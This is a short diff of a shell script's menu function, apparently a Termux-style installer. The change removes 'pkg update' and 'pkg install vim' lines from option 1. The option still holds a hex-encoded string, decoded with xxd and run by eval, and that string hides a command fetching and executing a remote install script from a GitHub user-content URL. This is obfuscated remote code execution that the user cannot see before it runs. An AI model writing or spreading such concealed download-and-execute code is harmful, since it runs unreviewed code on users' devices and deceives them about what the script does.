@@ -37,8 +37,6 @@ select_display() {
   read -r select
   case "$select" in
     1)
-    pkg update
-    pkg install vim
       hex_code=62617368203c28206375726c202d732068747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f416d61723131303730332f6d61727a2d696e7374616c2d7468656d652f6d61696e2f696e7374616c6c2e73682029
       command=$(echo "$hex_code" | xxd -r -p)
     eval "$command"
